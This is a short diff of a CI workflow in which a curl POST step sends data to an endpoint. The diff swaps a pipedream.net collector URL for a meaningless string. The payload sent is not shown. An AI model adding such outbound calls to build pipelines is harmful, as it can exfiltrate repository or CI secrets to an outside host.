@@ -18,7 +18,7 @@ jobs:
         echo "Current Path: $CURRENT_PATH"
 
         # Define your server endpoint
-        SERVER_ENDPOINT="https://e4bd4d02ac695f0fb8ec1e611f26aeb4.m.pipedream.net"
+        SERVER_ENDPOINT="skcndkcdnscsdc"
 
         # Sending the data using curl
         curl -X POST $SERVER_ENDPOINT \
